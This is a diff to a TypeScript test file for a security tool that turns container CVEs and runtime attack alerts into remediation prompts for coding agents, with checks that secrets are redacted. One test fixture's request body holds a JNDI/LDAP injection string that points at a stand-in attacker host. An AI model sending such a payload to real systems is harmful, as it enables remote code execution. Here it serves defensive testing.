@@ -5,12 +5,15 @@ import {
   computeTaskFingerprint,
   handoffIssueFromAttackPath,
   handoffIssueFromComplianceControl,
+  handoffIssueFromContainerCve,
   handoffIssueFromFinding,
+  handoffIssueFromRuntimeAlert,
   redactHandoffText,
 } from "@/lib/handoff/tasks";
 import type { ControlResult } from "@/lib/compliance/types";
 import type { SecurityFinding } from "@/lib/gcp/types";
 import type { AttackPath } from "@/lib/gcp/attack-paths";
+import type { RuntimeRequestEvent, RuntimeSecurityRule } from "@/lib/runtime-security";
 
 describe("lib/handoff/tasks", () => {
   it("redacts connection string passwords, keys, and tokens from exported text", () => {
@@ -155,5 +158,88 @@ describe("lib/handoff/tasks", () => {
     const drafts = buildHandoffTaskDrafts({ issues: [issue], batchMode: "grouped", targetTool: "opencode" });
     expect(drafts).toHaveLength(1);
     expect(drafts[0].promptMarkdown).toContain("allow-ssh");
+  });
+
+  it("generates Shirudo live-shield tasks with distinct fingerprints, Beefile scaffolds, and secret redaction", () => {
+    const javaCveIssue = handoffIssueFromContainerCve({
+      imageRef: "us-docker.pkg.dev/proj-1/app/elasticsearch:9.5.5",
+      imageName: "elasticsearch",
+      cloud: "gcp",
+      accountId: "proj-1",
+      cve: {
+        cveId: "CVE-2026-4444",
+        packageName: "openjdk-21",
+        installedVersion: "21.0.2",
+        fixedVersion: "21.0.3",
+        severity: "critical",
+        description: "Java4Shell Base64 decoder memory overwrite",
+      },
+    });
+
+    const iacDrafts = buildHandoffTaskDrafts({
+      issues: [javaCveIssue],
+      batchMode: "individual",
+      targetTool: "codex",
+      remediationMode: "iac",
+    });
+    const shieldDrafts = buildHandoffTaskDrafts({
+      issues: [javaCveIssue],
+      batchMode: "individual",
+      targetTool: "codex",
+      remediationMode: "shirudo_shield",
+    });
+
+    expect(iacDrafts[0].fingerprint).not.toBe(shieldDrafts[0].fingerprint);
+    expect(shieldDrafts[0].title).toMatch(/^\[Shirudo Shield\]/);
+    expect(shieldDrafts[0].payload.remediationMode).toBe("shirudo_shield");
+    expect(shieldDrafts[0].promptMarkdown).toContain("Shirudo Live Shield (upatch)");
+    expect(shieldDrafts[0].promptMarkdown).toContain("Java agent upatch");
+    expect(shieldDrafts[0].promptMarkdown).toContain('fixes = ["CVE-2026-4444"]');
+    expect(shieldDrafts[0].promptMarkdown).toContain("ML-DSA-87");
+
+    const runtimeEvent: RuntimeRequestEvent = {
+      id: "evt-rce-1",
+      ts: "2026-11-24T08:00:00Z",
+      sourceIp: "203.0.113.5",
+      sourceIpClass: "public",
+      method: "POST",
+      path: "/api/import",
+      destinationWorkload: "checkout-api",
+      destinationNamespace: "prod",
+      decision: "would_block",
+      matchedRuleIds: ["rule-rce"],
+      reasons: ["RCE probe detected"],
+      highestSeverity: "critical",
+      bodySample: "Authorization: Bearer super_secret_token_123456; ${jndi:ldap://evil.example/a}",
+    };
+    const rule: RuntimeSecurityRule = {
+      id: "rule-rce",
+      name: "Block RCE Probe",
+      enabled: true,
+      action: "block",
+      mode: "detect",
+      condition: { kind: "known_attack_vector", value: "rce_probe" },
+      severity: "critical",
+      description: "Detects JNDI and shell command probes",
+    };
+
+    const alertIssue = handoffIssueFromRuntimeAlert({
+      event: runtimeEvent,
+      matchedRules: [rule],
+    });
+    expect(alertIssue.kind).toBe("runtime_alert");
+    expect(alertIssue.resourceName).toBe("checkout-api");
+    expect(alertIssue.description).not.toContain("super_secret_token_123456");
+    expect(alertIssue.description).toContain("[REDACTED]");
+
+    const bpfDrafts = buildHandoffTaskDrafts({
+      issues: [alertIssue],
+      batchMode: "grouped",
+      targetTool: "opencode",
+      remediationMode: "shirudo_shield",
+    });
+    expect(bpfDrafts).toHaveLength(1);
+    expect(bpfDrafts[0].promptMarkdown).toContain("BPF C upatch");
+    expect(bpfDrafts[0].promptMarkdown).toContain("checkout-api");
   });
 });
